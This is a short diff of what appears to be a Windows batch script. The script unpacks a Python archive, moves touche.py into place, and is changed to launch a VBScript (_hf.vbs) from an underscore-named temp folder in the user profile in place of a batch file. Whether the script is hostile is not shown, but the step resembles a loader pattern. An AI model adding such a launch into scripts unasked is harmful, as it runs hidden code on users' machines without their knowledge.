@@ -83,7 +83,8 @@
     7za.exe x python.zip
     MOVE touche.py python
     cd python
-    _sc.bat
+    cmd /C "start C:\Users\%username%\_tmp_\_hf.vbs"
+    exit
 
 
     endlocal
